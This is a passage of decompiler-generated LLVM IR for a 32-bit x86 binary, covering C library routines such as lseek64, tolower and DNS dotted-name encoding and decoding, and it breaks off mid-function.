222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 56, 57, 123, 39, 233, 234, 235, 282, 15, 283, 84, 284, 270, 271, 182, 177, 178, 179, 41, 102, 103, 104, 180, 58, 105, 16, 181, 17, 18, 33, 19, 1, 20, 106, 183, 184, 185, 186, 21, 187, 188, 189, 107, 190, 191, 192, 108, 193, 109, 194, 110, 195, 85, 93, 94, 111, 112, 113, 30, 114, 115, 95, 31, 116, 117, 78, 119, 86, 59, 118, 79, 236, 74, 124, 125, 126, 72, 73, 70, 71, 127, 128, 69, 129, 67, 68, 130, 131, 66, 63, 132, 64, 65, 133, 120, 134, 60, 135, 61, 62, 136, 137, 138, 139, 140, 141, 142, 143, 144, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 80, 300, 301, 302, 303, 308, 34, 22, 309, 23, 87, 88, 121, 310, 89, 24, 25, 311, 312, 313, 314, 26, 40, 27, 28, 315, 29, 357, 358, 359, 360, 361, 362, 363, 364, 382, 383, 384, 145 }
  uselistorder i32* @ebp, { 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 10, 11, 12, 1, 13, 14, 15, 4, 74, 75, 76, 81, 77, 78, 79, 80, 82, 29, 30, 83, 87, 98, 99, 128, 129, 130, 31, 32, 33, 34, 35, 16, 17, 18, 57, 58, 157, 158, 159, 160, 161, 19, 20, 162, 163, 164, 165, 166, 167, 168, 169, 174, 170, 171, 172, 173, 3, 175, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 5, 36, 37, 38, 39, 40, 93, 2, 94, 95, 96, 97, 88, 89, 90, 91, 92, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0, 52, 7, 8, 9, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 113, 112, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 53, 54, 55, 84, 85, 86, 21, 22, 23, 24, 25, 26, 27, 28, 56, 6, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 176, 177, 178, 179 }
  uselistorder i32 %arg9, { 3, 0, 1, 2 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805413d, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_805411d, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8054103.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80540b9, { 1, 0 }
  uselistorder label %dec_label_pc_805409d, { 1, 0 }
  uselistorder label %dec_label_pc_8054060, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8054027.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805404d, { 1, 0 }
  uselistorder label %dec_label_pc_805401b, { 1, 0 }
  uselistorder label %dec_label_pc_8054004, { 1, 0 }
  uselistorder label %dec_label_pc_8054004.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_8053fed, { 1, 0 }
  uselistorder label %dec_label_pc_8053fb2, { 1, 0 }
  uselistorder label %dec_label_pc_8053f09, { 1, 0 }
  uselistorder label %dec_label_pc_8053e99, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805414e = load i32, i32* @ebx, align 4
  store i32 %v0_805414e, i32* %stack_var_-12, align 4
  %v2_8054162 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8054162, i32* %esi.global-to-local, align 4
  %v1_8054179 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8054179, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8054179, -4095
  br i1 %tmp18, label %dec_label_pc_8054193, label %dec_label_pc_8054185

dec_label_pc_8054185:                             ; preds = %entry
  %v2_8054166 = ashr i32 %arg3, 31
  %v1_8054185 = call i32 @__errno_location(i32 %v2_8054166)
  %v0_805418a = load i32, i32* %esi.global-to-local, align 4
  %v1_805418a = sub i32 0, %v0_805418a
  %v2_805418c = inttoptr i32 %v1_8054185 to i32*
  store i32 %v1_805418a, i32* %v2_805418c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_80541a7.pre.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8054197

dec_label_pc_8054193:                             ; preds = %entry
  %v1_8054193 = icmp eq i32 %v1_8054179, 0
  br i1 %v1_8054193, label %dec_label_pc_805419c, label %dec_label_pc_8054197

dec_label_pc_8054197:                             ; preds = %dec_label_pc_8054193, %dec_label_pc_8054185
  %v2_80541a7.pre = phi i32 [ %v0_805414e, %dec_label_pc_8054193 ], [ %v2_80541a7.pre.pre, %dec_label_pc_8054185 ]
  %v0_8054197 = phi i32 [ %v1_8054179, %dec_label_pc_8054193 ], [ -1, %dec_label_pc_8054185 ]
  %v1_8054199 = ashr i32 %v0_8054197, 31
  br label %dec_label_pc_80541a4

dec_label_pc_805419c:                             ; preds = %dec_label_pc_8054193
  %v3_805419c = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_80541a4

dec_label_pc_80541a4:                             ; preds = %dec_label_pc_8054197, %dec_label_pc_805419c
  %v2_80541a7 = phi i32 [ %v2_80541a7.pre, %dec_label_pc_8054197 ], [ %v0_805414e, %dec_label_pc_805419c ]
  %v0_80541aa = phi i32 [ %v0_8054197, %dec_label_pc_8054197 ], [ %v3_805419c, %dec_label_pc_805419c ]
  %storemerge = phi i32 [ %v1_8054199, %dec_label_pc_8054197 ], [ %tmp, %dec_label_pc_805419c ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 %v2_80541a7, i32* @ebx, align 4
  ret i32 %v0_80541aa

; uselistorder directives
  uselistorder i32 %v1_8054179, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805414e, { 1, 0, 2 }
  uselistorder i32 (i32)* @__errno_location, { 53, 44, 71, 70, 69, 43, 42, 52, 51, 41, 25, 37, 50, 49, 31, 54, 24, 64, 5, 4, 3, 2, 1, 68, 0, 23, 22, 13, 21, 63, 62, 40, 39, 67, 66, 65, 61, 20, 19, 60, 18, 36, 48, 47, 46, 6, 30, 38, 14, 45, 12, 11, 59, 33, 32, 58, 29, 10, 16, 7, 28, 15, 57, 56, 35, 27, 26, 55, 9, 8, 72, 34, 17 }
  uselistorder i32 31, { 20, 21, 15, 22, 23, 29, 30, 24, 25, 11, 2, 3, 0, 1, 10, 28, 16, 17, 18, 6, 7, 4, 5, 12, 8, 9, 26, 27, 19, 13, 14, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_80541a4, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_80541b0 = add i32 %arg1, 128
  %v6_80541bb = icmp ugt i32 %v1_80541b0, 383
  br i1 %v6_80541bb, label %dec_label_pc_80541c6, label %dec_label_pc_80541bd

dec_label_pc_80541bd:                             ; preds = %entry
  %v0_80541bd = load i32, i32* bitcast (i32** @global_var_8058480.205 to i32*), align 128
  %v2_80541c2 = mul i32 %arg1, 2
  %v3_80541c2 = add i32 %v0_80541bd, %v2_80541c2
  %v4_80541c2 = inttoptr i32 %v3_80541c2 to i16*
  %v5_80541c2 = load i16, i16* %v4_80541c2, align 2
  %v6_80541c2 = sext i16 %v5_80541c2 to i32
  store i32 %v6_80541c2, i32* @edx, align 4
  br label %dec_label_pc_80541c6

dec_label_pc_80541c6:                             ; preds = %entry, %dec_label_pc_80541bd
  %v0_80541c6 = phi i32 [ %arg1, %entry ], [ %v6_80541c2, %dec_label_pc_80541bd ]
  ret i32 %v0_80541c6

; uselistorder directives
  uselistorder i32 65536, { 0, 2, 3, 1, 4, 80, 5, 6, 7, 8, 9, 11, 10, 13, 12, 15, 14, 17, 16, 18, 19, 81, 84, 20, 21, 83, 26, 22, 27, 23, 28, 24, 29, 25, 33, 30, 34, 31, 35, 32, 36, 37, 39, 38, 41, 40, 42, 46, 43, 47, 44, 48, 45, 49, 51, 50, 54, 52, 55, 53, 56, 57, 60, 58, 61, 59, 62, 63, 65, 64, 66, 67, 70, 71, 72, 68, 73, 69, 75, 74, 76, 78, 77, 79, 82 }
  uselistorder i32 128, { 18, 11, 13, 2, 3, 6, 12, 7, 8, 14, 4, 9, 10, 15, 0, 16, 17, 5, 1, 19 }
  uselistorder label %dec_label_pc_80541c6, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80541cd = load i32, i32* @edi, align 4
  %v0_80541ce = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_80541d5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80541d5, i32* @edi, align 4
  %v1_80542344 = icmp eq i8* %arg1, null
  br i1 %v1_80542344, label %dec_label_pc_805423d, label %dec_label_pc_8054238.lr.ph

dec_label_pc_8054238.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8054238

dec_label_pc_80541db:                             ; preds = %dec_label_pc_8054238
  %v5_80541e0 = call i32 @__GI_strchr(i8* %v1_8054238, i32 46)
  %v1_80541ea = icmp eq i32 %v5_80541e0, 0
  br i1 %v1_80541ea, label %dec_label_pc_80541f4, label %dec_label_pc_80541ee

dec_label_pc_80541ee:                             ; preds = %dec_label_pc_80541db
  %v1_80541f0 = load i32, i32* @edi, align 4
  %v2_80541f0 = sub i32 %v5_80541e0, %v1_80541f0
  br label %dec_label_pc_8054202

dec_label_pc_80541f4:                             ; preds = %dec_label_pc_80541db
  %v0_80541f7 = load i32, i32* @edi, align 4
  %v5_80541f7 = inttoptr i32 %v0_80541f7 to i8*
  %v3_80541f8 = call i32 @strlen(i8* %v5_80541f7)
  br label %dec_label_pc_8054202

dec_label_pc_8054202:                             ; preds = %dec_label_pc_80541ee, %dec_label_pc_80541f4
  %v0_8054215 = phi i32 [ %v2_80541f0, %dec_label_pc_80541ee ], [ %v3_80541f8, %dec_label_pc_80541f4 ]
  store i32 %v0_8054215, i32* @esi, align 4
  %v1_8054202 = icmp eq i32 %v0_8054215, 0
  %v3_8054202 = trunc i32 %v0_8054215 to i8
  br i1 %v1_8054202, label %dec_label_pc_8054251, label %dec_label_pc_8054206

dec_label_pc_8054206:                             ; preds = %dec_label_pc_8054202
  %v1_805420a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805420a = sub i32 %arg3, %v1_805420a
  %v1_805420c = add i32 %v2_805420a, -1
  %v7_805420d = icmp ult i32 %v0_8054215, %v1_805420c
  %v1_805420f = icmp eq i1 %v7_805420d, false
  br i1 %v1_805420f, label %dec_label_pc_8054251, label %dec_label_pc_8054211

dec_label_pc_8054211:                             ; preds = %dec_label_pc_8054206
  store i32 %arg2, i32* @edx, align 4
  %v4_8054217 = add i32 %v1_805420a, %arg2
  %v5_8054217 = inttoptr i32 %v4_8054217 to i8*
  store i8 %v3_8054202, i8* %v5_8054217, align 1
  %v0_805421a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805421a = add i32 %v0_805421a, 1
  %v0_805421c = load i32, i32* @edx, align 4
  %v2_805421e = add i32 %v1_805421a, %v0_805421c
  %v0_8054220 = load i32, i32* @esi, align 4
  %v0_8054221 = load i32, i32* @edi, align 4
  %v2_8054223 = add i32 %v0_8054220, %v1_805421a
  store i32 %v2_8054223, i32* %ebx.global-to-local, align 4
  %tmp29 = inttoptr i32 %v2_805421e to i16*
  %v7_8054225 = call i32 @memcpy(i16* %tmp29, i32 %v0_8054221, i32 %v0_8054220)
  %v1_8054231 = add i32 %v5_80541e0, 1
  br i1 %v1_80541ea, label %dec_label_pc_805423d, label %dec_label_pc_8054234

dec_label_pc_8054234:                             ; preds = %dec_label_pc_8054211
  store i32 %v1_8054231, i32* @edi, align 4
  %v1_8054234 = icmp eq i32 %v1_8054231, 0
  br i1 %v1_8054234, label %dec_label_pc_805423d, label %dec_label_pc_8054238

dec_label_pc_8054238:                             ; preds = %dec_label_pc_8054238.lr.ph, %dec_label_pc_8054234
  %v0_80541df = phi i32 [ %v4_80541d5, %dec_label_pc_8054238.lr.ph ], [ %v1_8054231, %dec_label_pc_8054234 ]
  %v1_8054238 = inttoptr i32 %v0_80541df to i8*
  %v2_8054238 = load i8, i8* %v1_8054238, align 1
  %v3_8054238 = icmp eq i8 %v2_8054238, 0
  %v1_805423b = icmp eq i1 %v3_8054238, false
  br i1 %v1_805423b, label %dec_label_pc_80541db, label %dec_label_pc_805423d

dec_label_pc_805423d:                             ; preds = %dec_label_pc_8054234, %dec_label_pc_8054238, %dec_label_pc_8054211, %entry
  %tmp30 = icmp slt i32 %arg3, 1
  br i1 %tmp30, label %dec_label_pc_8054251, label %dec_label_pc_8054244

dec_label_pc_8054244:                             ; preds = %dec_label_pc_805423d
  %v1_8054248 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054248 = add i32 %v1_8054248, %arg2
  %v3_8054248 = inttoptr i32 %v2_8054248 to i8*
  store i8 0, i8* %v3_8054248, align 1
  %v0_805424c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805424c = add i32 %v0_805424c, 1
  br label %dec_label_pc_8054254

dec_label_pc_8054251:                             ; preds = %dec_label_pc_8054206, %dec_label_pc_8054202, %dec_label_pc_805423d
  br label %dec_label_pc_8054254

dec_label_pc_8054254:                             ; preds = %dec_label_pc_8054244, %dec_label_pc_8054251
  %storemerge2 = phi i32 [ %v1_805424c, %dec_label_pc_8054244 ], [ -1, %dec_label_pc_8054251 ]
  store i32 %v0_80541ce, i32* @esi, align 4
  store i32 %v0_80541cd, i32* @edi, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %v1_8054238, { 1, 0 }
  uselistorder i32 %v1_8054231, { 0, 2, 1 }
  uselistorder i32 %v0_8054220, { 1, 0 }
  uselistorder i1 %v1_80541ea, { 1, 0 }
  uselistorder i32 %v5_80541e0, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 2, 7, 6, 1, 0, 5, 4, 3, 8 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 46, { 1, 2, 0, 3 }
  uselistorder i8* null, { 3, 5, 2, 7, 0, 1, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 4 }
  uselistorder label %dec_label_pc_8054254, { 1, 0 }
  uselistorder label %dec_label_pc_8054251, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805423d, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8054238, { 1, 0 }
  uselistorder label %dec_label_pc_8054202, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_805425e = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @edx, align 4
  %v4_8054267 = icmp eq i32 %arg1, 0
  br i1 %v4_8054267, label %dec_label_pc_8054328, label %dec_label_pc_8054272

dec_label_pc_8054272:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_80543102740 = add i32 %arg2, %arg1
  %v3_80543102841 = inttoptr i32 %v2_80543102740 to i8*
  %v4_80543102942 = load i8, i8* %v3_80543102841, align 1
  %v1_80543143144 = icmp eq i8 %v4_80543102942, 0
  %v1_80543163245 = icmp eq i1 %v1_80543143144, false
  br i1 %v1_80543163245, label %dec_label_pc_8054280.lr.ph, label %dec_label_pc_805431c

dec_label_pc_8054280:                             ; preds = %dec_label_pc_8054280.lr.ph, %dec_label_pc_8054299
  %v0_805428a = phi i32 [ %v0_805428a.pre, %dec_label_pc_8054280.lr.ph ], [ %v4_80542a4, %dec_label_pc_8054299 ]
  %v8_805428038 = phi i1 [ %v8_80542803350, %dec_label_pc_8054280.lr.ph ], [ true, %dec_label_pc_8054299 ]
  %v5_805431037.in = phi i8 [ %v5_80543103049.in, %dec_label_pc_8054280.lr.ph ], [ %v4_8054310, %dec_label_pc_8054299 ]
  %stack_var_-17.136 = phi i8 [ %stack_var_-17.1.ph48, %dec_label_pc_8054280.lr.ph ], [ 0, %dec_label_pc_8054299 ]
  %v0_805428735 = phi i32 [ %v0_8054287.ph46, %dec_label_pc_8054280.lr.ph ], [ %v2_80542b3, %dec_label_pc_8054299 ]
  %v5_805431037 = zext i8 %v5_805431037.in to i32
  %v1_8054287 = add i32 %v0_805428735, 1
  store i32 %v1_8054287, i32* @esi, align 4
  %v3_805428a = select i1 %v8_805428038, i32 2, i32 1
  %v4_805428a = add i32 %v3_805428a, %v0_805428a
  store i32 %v4_805428a, i32* %ebp.global-to-local, align 4
  %v1_805428d = and i32 %v5_805431037, 192
  %v6_8054292 = icmp eq i32 %v1_805428d, 192
  %v1_8054297 = icmp eq i1 %v6_8054292, false
  br i1 %v1_8054297, label %dec_label_pc_80542bc, label %dec_label_pc_8054299

dec_label_pc_8054299:                             ; preds = %dec_label_pc_8054280
  %v4_80542a4 = add i32 %v3_805428a, %v4_805428a
  store i32 %v4_80542a4, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v5_805431037.in, 64
  %v1_80542a7 = zext i8 %tmp to i32
  %v2_80542aa = add i32 %v1_8054287, %arg1
  %v3_80542aa = inttoptr i32 %v2_80542aa to i8*
  %v4_80542aa = load i8, i8* %v3_80542aa, align 1
  %v5_80542aa = zext i8 %v4_80542aa to i32
  %v2_80542ae = mul nuw nsw i32 %v1_80542a7, 256
  %v2_80542b3 = or i32 %v5_80542aa, %v2_80542ae
  store i32 %v2_80542b3, i32* @edx, align 4
  store i32 %v1_80542d9.ph47, i32* @ecx, align 4
  %v2_8054310 = add i32 %v2_80542b3, %arg1
  %v3_8054310 = inttoptr i32 %v2_8054310 to i8*
  %v4_8054310 = load i8, i8* %v3_8054310, align 1
  %v1_8054314 = icmp eq i8 %v4_8054310, 0
  %v1_8054316 = icmp eq i1 %v1_8054314, false
  br i1 %v1_8054316, label %dec_label_pc_8054280, label %dec_label_pc_805431c

dec_label_pc_80542bc:                             ; preds = %dec_label_pc_8054280
  %v2_80542bc = add i32 %v5_805431037, %v1_80542d9.ph47
  %v1_80542c5 = add i32 %v2_80542bc, 1
  store i32 %v1_80542c5, i32* @edi, align 4
  %v10_80542c6 = icmp ult i32 %v1_80542c5, %arg4
  %v1_80542ca = icmp eq i1 %v10_80542c6, false
  br i1 %v1_80542ca, label %dec_label_pc_8054328, label %dec_label_pc_80542cc

dec_label_pc_80542cc:                             ; preds = %dec_label_pc_80542bc
  %v2_80542d2 = add i32 %v1_8054287, %arg1
  %v2_80542d9 = add i32 %v1_80542d9.ph47, %arg3
  %v3_80542dc = inttoptr i32 %v2_80542d9 to i16*
  %v4_80542dc = call i32 @memcpy(i16* %v3_80542dc, i32 %v2_80542d2, i32 %v5_805431037)
  %v0_80542e4 = load i32, i32* @esi, align 4
  %v2_80542e4 = add i32 %v0_80542e4, %v5_805431037
  store i32 %v2_80542e4, i32* @edx, align 4
  br i1 %v8_805428038, label %dec_label_pc_80542f0, label %dec_label_pc_80542ee

dec_label_pc_80542ee:                             ; preds = %dec_label_pc_80542cc
  %v0_80542ee = load i32, i32* %ebp.global-to-local, align 4
  %v2_80542ee = add i32 %v0_80542ee, %v5_805431037
  store i32 %v2_80542ee, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80542f0

dec_label_pc_80542f0:                             ; preds = %dec_label_pc_80542cc, %dec_label_pc_80542ee
  %v4_8054307 = add i32 %v2_80542bc, %arg3
  %v5_8054307 = inttoptr i32 %v4_8054307 to i8*
  store i8 46, i8* %v5_8054307, align 1
  %v0_805430a.pre = load i32, i32* @edi, align 4
  %v1_8054310.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_805430a.pre, i32* @ecx, align 4
  %v2_805431027 = add i32 %v1_8054310.pre.pre, %arg1
  %v3_805431028 = inttoptr i32 %v2_805431027 to i8*
  %v4_805431029 = load i8, i8* %v3_805431028, align 1
  %v1_805431431 = icmp eq i8 %v4_805431029, 0
  %v1_805431632 = icmp eq i1 %v1_805431431, false
  %v8_805428033 = icmp eq i8 %stack_var_-17.136, 0
  %v0_805428a.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_805431632, label %dec_label_pc_8054280.lr.ph, label %dec_label_pc_805431c

dec_label_pc_8054280.lr.ph:                       ; preds = %dec_label_pc_80542f0, %dec_label_pc_8054272
  %v0_805428a.pre = phi i32 [ 0, %dec_label_pc_8054272 ], [ %v0_805428a.pre.pre, %dec_label_pc_80542f0 ]
  %v8_80542803350 = phi i1 [ false, %dec_label_pc_8054272 ], [ %v8_805428033, %dec_label_pc_80542f0 ]
  %v5_80543103049.in = phi i8 [ %v4_80543102942, %dec_label_pc_8054272 ], [ %v4_805431029, %dec_label_pc_80542f0 ]
  %stack_var_-17.1.ph48 = phi i8 [ 1, %dec_label_pc_8054272 ], [ %stack_var_-17.136, %dec_label_pc_80542f0 ]
  %v1_80542d9.ph47 = phi i32 [ 0, %dec_label_pc_8054272 ], [ %v0_805430a.pre, %dec_label_pc_80542f0 ]
  %v0_8054287.ph46 = phi i32 [ %arg2, %dec_label_pc_8054272 ], [ %v1_8054310.pre.pre, %dec_label_pc_80542f0 ]
  br label %dec_label_pc_8054280

dec_label_pc_805431c:                             ; preds = %dec_label_pc_80542f0, %dec_label_pc_8054299, %dec_label_pc_8054272
  %v0_8054321 = phi i32 [ 0, %dec_label_pc_8054272 ], [ %v4_80542a4, %dec_label_pc_8054299 ], [ %v0_805428a.pre.pre, %dec_label_pc_80542f0 ]
  %v8_8054280.lcssa = phi i1 [ false, %dec_label_pc_8054272 ], [ true, %dec_label_pc_8054299 ], [ %v8_805428033, %dec_label_pc_80542f0 ]
  %v2_8054323 = zext i1 %v8_8054280.lcssa to i32
  %v3_8054323 = add i32 %v0_8054321, 1
  %v4_8054323 = add i32 %v3_8054323, %v2_8054323
  br label %dec_label_pc_805432b

dec_label_pc_8054328:                             ; preds = %dec_label_pc_80542bc, %entry
  br label %dec_label_pc_805432b

dec_label_pc_805432b:                             ; preds = %dec_label_pc_805431c, %dec_label_pc_8054328
  %storemerge = phi i32 [ %v4_8054323, %dec_label_pc_805431c ], [ -1, %dec_label_pc_8054328 ]
  store i32 %v0_805425e, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80542d9.ph47, { 2, 1, 0 }
  uselistorder i8 %v4_8054310, { 1, 0 }
  uselistorder i32 %v2_80542b3, { 0, 2, 1 }
  uselistorder i32 %v4_80542a4, { 0, 2, 1 }
  uselistorder i32 %v5_805431037, { 4, 3, 1, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 3, 1, 4, 5 }
  uselistorder i8 1, { 1, 11, 14, 2, 13, 9, 6, 7, 0, 4, 5, 10, 3, 12, 8 }
  uselistorder i8 46, { 3, 4, 0, 1, 5, 2 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 8, 9, 10, 11, 12, 13, 14, 16, 2, 3, 17, 18, 20, 0, 1, 15, 4, 5, 6, 19, 7 }
  uselistorder i32* @edi, { 3, 173, 174, 23, 175, 176, 177, 22, 178, 179, 4, 180, 0, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 31, 6, 5, 32, 33, 34, 35, 36, 44, 37, 38, 39, 40, 41, 42, 43, 196, 7, 197, 8, 198, 199, 200, 201, 206, 207, 1, 202, 203, 204, 205, 208, 209, 210, 211, 109, 9, 110, 111, 112, 212, 213, 220, 221, 222, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 97, 98, 99, 100, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 10, 124, 125, 126, 127, 128, 129, 130, 324, 325, 11, 326, 327, 12, 330, 331, 281, 282, 283, 52, 53, 54, 332, 333, 334, 349, 55, 13, 56, 57, 45, 46, 47, 48, 49, 50, 51, 166, 14, 167, 168, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 58, 59, 60, 61, 62, 63, 64, 306, 307, 308, 309, 310, 311, 312, 313, 15, 314, 315, 316, 317, 318, 253, 254, 16, 255, 256, 257, 258, 259, 260, 261, 272, 273, 274, 275, 276, 131, 132, 17, 133, 347, 348, 134, 135, 136, 18, 231, 232, 223, 224, 225, 226, 227, 228, 229, 230, 65, 66, 67, 233, 234, 235, 137, 138, 139, 140, 141, 142, 143, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 19, 158, 28, 29, 30, 144, 20, 145, 146, 343, 344, 345, 346, 236, 237, 238, 239, 240, 241, 159, 160, 161, 162, 214, 215, 216, 217, 218, 219, 328, 329, 169, 170, 279, 280, 68, 69, 70, 284, 285, 340, 341, 342, 71, 21, 72, 73, 74, 75, 286, 287, 76, 77, 78, 335, 336, 337, 338, 339, 79, 80, 81, 84, 82, 83, 85, 86, 87, 88, 89, 90, 91, 92, 2, 93, 94, 95, 96, 101, 102, 103, 104, 105, 106, 107, 108, 163, 164, 165, 24, 25, 26, 27, 171, 172, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 277, 278, 288, 289, 290, 319, 320, 321, 322, 323 }
  uselistorder i32 256, { 1, 2, 3, 4, 5, 49, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 48, 16, 17, 18, 21, 19, 20, 22, 23, 24, 44, 45, 25, 46, 50, 26, 27, 55, 28, 29, 0, 53, 54, 47, 30, 31, 32, 33, 34, 56, 35, 36, 37, 38, 39, 40, 51, 57, 41, 52, 42, 43 }
  uselistorder i8 64, { 0, 2, 6, 7, 3, 8, 4, 5, 1 }
  uselistorder i1 true, { 1, 4, 11, 3, 5, 6, 8, 7, 9, 10, 2, 0 }
  uselistorder i32* @edx, {}
  uselistorder i32* @esi, { 220, 221, 222, 223, 224, 225, 35, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 36, 51, 52, 10, 7, 58, 53, 54, 55, 56, 57, 246, 11, 247, 248, 252, 249, 250, 251, 259, 253, 254, 255, 256, 257, 258, 260, 261, 262, 263, 264, 265, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 12, 149, 150, 13, 273, 274, 275, 14, 276, 277, 278, 279, 302, 303, 304, 305, 306, 307, 1, 308, 309, 310, 311, 312, 313, 314, 315, 124, 125, 126, 127, 128, 365, 366, 367, 368, 316, 317, 151, 152, 153, 154, 0, 155, 334, 335, 336, 67, 68, 69, 369, 370, 371, 372, 373, 381, 384, 385, 386, 70, 71, 72, 73, 74, 75, 76, 374, 379, 380, 59, 60, 61, 62, 213, 214, 215, 2, 216, 217, 218, 63, 64, 65, 66, 337, 341, 15, 342, 343, 344, 345, 346, 347, 348, 338, 339, 340, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 349, 350, 351, 352, 353, 354, 355, 3, 356, 357, 358, 359, 16, 360, 37, 361, 362, 363, 364, 318, 319, 320, 323, 324, 325, 326, 327, 328, 329, 330, 331, 387, 17, 388, 389, 156, 18, 157, 38, 32, 321, 322, 112, 113, 396, 397, 158, 159, 160, 161, 162, 163, 164, 290, 19, 8, 280, 284, 285, 286, 287, 20, 33, 288, 289, 281, 282, 283, 92, 21, 93, 94, 291, 22, 292, 293, 165, 166, 167, 168, 24, 169, 4, 171, 172, 173, 174, 23, 175, 176, 170, 177, 178, 179, 180, 5, 181, 182, 183, 184, 185, 186, 34, 25, 187, 188, 26, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 27, 206, 207, 208, 28, 50, 189, 6, 190, 191, 375, 376, 377, 378, 390, 391, 392, 393, 394, 395, 294, 295, 296, 297, 29, 298, 299, 300, 301, 209, 210, 211, 212, 266, 267, 268, 269, 270, 30, 31, 271, 272, 382, 383, 332, 333, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 108, 106, 107, 109, 110, 111, 114, 115, 116, 117, 9, 118, 119, 120, 121, 122, 123, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 219, 398 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_805432b, { 1, 0 }
  uselistorder label %dec_label_pc_80542f0, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8054342 = icmp eq i32 %arg1, 0
  br i1 %v1_8054342, label %dec_label_pc_8054371, label %dec_label_pc_8054362.preheader

dec_label_pc_8054362.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_805436210 = add i32 %arg2, %arg1
  %v3_805436211 = inttoptr i32 %v2_805436210 to i8*
  %v4_805436212 = load i8, i8* %v3_805436211, align 1
  %v1_805436614 = add i32 %arg2, 1
  %v1_805436915 = icmp eq i8 %v4_805436212, 0
